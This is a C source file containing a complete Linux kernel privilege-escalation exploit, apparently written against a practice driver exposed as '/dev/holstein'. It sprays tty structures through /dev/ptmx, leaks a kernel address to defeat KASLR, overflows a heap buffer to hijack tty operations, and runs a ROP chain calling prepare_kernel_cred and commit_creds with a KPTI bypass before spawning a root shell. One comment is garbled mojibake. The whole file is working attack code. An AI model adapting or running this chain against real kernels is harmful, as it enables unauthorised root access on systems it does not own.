#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define ofs_tty_ops 0xc38880
#define addr_commit_creds (kbase + 0x0744b0)
#define addr_prepare_kernel_cred (kbase + 0x074650)
#define rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp (kbase + 0x3a478a)
#define rop_pop_rdi (kbase + 0x0d748d)
#define rop_pop_rcx (kbase + 0x13c1c4)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x62707b)
#define rop_bypass_kpti (kbase + 0x800e26)

unsigned long kbase, g_buf;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm("movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  save_state();

  // tty_struct spray
  int spray[100];
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  // tty_struct
  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1)
    fatal("/dev/holstein");

  // tty_struct spray
  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  // KASLR
  char buf[0x500];
  read(fd, buf, 0x500);
  printf("[+] leaked = 0x%016lx",*(unsigned long*)(buf + 0x418));
  kbase = *(unsigned long *)&buf[0x418] - ofs_tty_ops;
  printf("[+] kbase = 0x%016lx\n", kbase);

  // g_buf
  g_buf = *(unsigned long *)&buf[0x438] - 0x438;
  printf("[+] g_buf = 0x%016lx\n", g_buf);

  unsigned long *p = (unsigned long *)&buf[0x400];
  p[12] = rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp;
  *(unsigned long *)&buf[0x418] = g_buf + 0x400;
  printf("kheap: %16lx\n", *(unsigned long *)&buf[0x418]);

  // ROP chain
  unsigned long *chain = (unsigned long *)&buf;
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = addr_prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = addr_commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  // Heap Buffer Overflow
  write(fd, buf, 0x500);

  // RIP
  for (int i = 0; i < 100; i++) {
    ioctl(spray[i], 0xdeadbeef,
          g_buf - 0x10); // pop r13,rbpã®åˆ†ã‚’å¼•ã„ãŸ
  }

  getchar();
  return 0;
}
